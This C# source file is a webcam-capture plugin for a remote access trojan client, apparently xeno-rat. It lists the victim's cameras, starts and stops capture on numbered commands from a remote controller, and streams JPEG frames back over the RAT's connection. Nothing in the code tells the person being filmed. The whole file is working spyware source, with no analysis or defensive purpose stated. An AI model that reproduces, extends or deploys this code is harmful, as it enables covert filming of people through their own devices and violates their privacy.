using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        VideoCaptureDevice videoSource;
        FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        string monkier = "";
        int quality = 70;
        bool playing = false;
        Node ImageNode;

        /// <summary>
        /// Runs the specified node and performs necessary operations, such as sending a byte array to indicate connection, setting the monkier if video devices are available, and handling exceptions during the receive operation.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <remarks>
        /// This method sends a byte array to the specified <paramref name="node"/> to indicate that it has connected. If there are video devices available, it sets the <paramref name="monkier"/> to the MonikerString of the first video device in the list.
        /// It then attempts to receive data from the <paramref name="node"/> and handles any exceptions that may occur during the receive operation. If an exception occurs, it disconnects the ImageNode, the <paramref name="node"/>, and signals the video source to stop. Finally, it performs garbage collection.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (videoDevices.Count > 0) 
            {
                monkier = videoDevices[0].MonikerString;
            }
            try
            {
                await RecvThread(node);
            }
            catch 
            {
                ImageNode?.Disconnect();
                node.Disconnect();
                videoSource?.SignalToStop();
            }
            GC.Collect();
        }

        /// <summary>
        /// Captures a frame and sends it to the specified ImageNode if playing is true.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="eventArgs">The event data.</param>
        /// <remarks>
        /// This method captures a frame from the eventArgs and converts it to a byte array.
        /// If playing is true, the frame is then sent to the specified ImageNode using the SendAsync method.
        /// </remarks>
        public async void Capture(object sender, NewFrameEventArgs eventArgs)
        {
            if (playing)
            {
                byte[] frameBytes;
                using (var stream = new System.IO.MemoryStream())
                {
                    var qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                    var jpegEncoder = GetEncoderInfo(ImageFormat.Jpeg);

                    var encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = qualityParam;

                    eventArgs.Frame.Save(stream, jpegEncoder, encoderParams);
                    frameBytes = stream.ToArray();
                }
                if (ImageNode != null || frameBytes == null)
                {
                    await ImageNode.SendAsync(frameBytes);
                }
            }
        }

        /// <summary>
        /// Retrieves the image codec information for the specified image format.
        /// </summary>
        /// <param name="format">The image format for which to retrieve the codec information.</param>
        /// <returns>The <see cref="ImageCodecInfo"/> object that corresponds to the specified <paramref name="format"/>. Returns null if no matching codec is found.</returns>
        private ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageEncoders();
            foreach (var codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        /// <summary>
        /// Asynchronous method to handle receiving data from a node.
        /// </summary>
        /// <param name="node">The node from which data is received.</param>
        /// <exception cref="Exception">Thrown when there is an issue with the node connection.</exception>
        /// <returns>An asynchronous task representing the receiving process.</returns>
        /// <remarks>
        /// This method continuously receives data from the specified <paramref name="node"/> while it is connected.
        /// If the received data is null, it disconnects the ImageNode and breaks the loop.
        /// It processes different types of data based on their first byte value and performs corresponding actions.
        /// The method handles video devices, setting the video source, stopping the video source, adding sub-nodes, and setting the quality of the node.
        /// </remarks>
        public async Task RecvThread(Node node) 
        {
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null)
                {
                    ImageNode?.Disconnect();
                    break;
                }
                if (data[0] == 0)
                {
                    videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    await node.SendAsync(node.sock.IntToBytes(videoDevices.Count));
                    foreach (FilterInfo i in videoDevices)
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i.Name));
                    }
                }
                else if (data[0] == 1)
                {
                    int index = node.sock.BytesToInt(await node.ReceiveAsync());
                    monkier = videoDevices[index].MonikerString;
                }
                else if (data[0] == 2)
                {
                    videoSource?.SignalToStop();
                    videoSource?.WaitForStop();
                    if (monkier == "")
                    {
                        playing = false;
                        return;
                    }
                    playing = true;
                    videoSource = new VideoCaptureDevice(monkier);
                    videoSource.NewFrame += Capture;
                    videoSource.Start();
                }
                else if (data[0] == 3)
                {
                    videoSource?.SignalToStop();
                    videoSource?.WaitForStop();
                    playing = false;
                }
                else if (data[0] == 4)
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        ImageNode = tempnode;
                    }
                    else
                    {
                        break;
                    }
                }
                else if (data[0] == 5) 
                {
                    quality = node.sock.BytesToInt(await node.ReceiveAsync());
                }
            }
        }
    }
}
